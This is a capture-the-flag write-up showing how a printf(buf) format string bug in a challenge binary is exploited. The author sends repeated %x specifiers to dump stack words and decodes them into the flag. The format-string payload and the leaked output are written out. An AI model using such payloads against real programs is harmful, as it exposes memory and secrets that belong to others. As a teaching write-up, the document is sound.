 Vulnerability:

The vulnerable line is: printf(buf);
Since user input is directly passed to printf without a format string, we can inject format specifiers (%x, %s, etc.) and read values from the stack.

I first tried to leak memory using %p, the standard format specifier to print pointers:
Why have you come here: %p %p %p %p
But all values came back as 0 or NULL. It seems %p is either sanitized or restricted in this binary/environment.

%x for Hex Dump:
Next, I tried using %x, which prints 4-byte words from the stack in hexadecimal:

Why have you come here: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x

This gave a promising stack leak:
64 80ec300 0 0 0 31666e31 7974316e 76334e7b 375f7233 37357572 3368375f 3335755f f7007d72 ...
From 31666e31, I noticed it was ASCII-encoded hex. When converted in little-endian, these values gave readable parts of the flag.

I collected the hex values:
31666e31  →  1fn1
7974316e  →  yt1n
76334e7b  →  v3N{
375f7233  →  7_r3
37357572  →  75ur
3368375f  →  3h7_
3335755f  →  35u_
f7007d72  →  garbage but ends in `}r`

flag - 1nf1n1ty{N3v3r_7ru57_7h3_u53r}

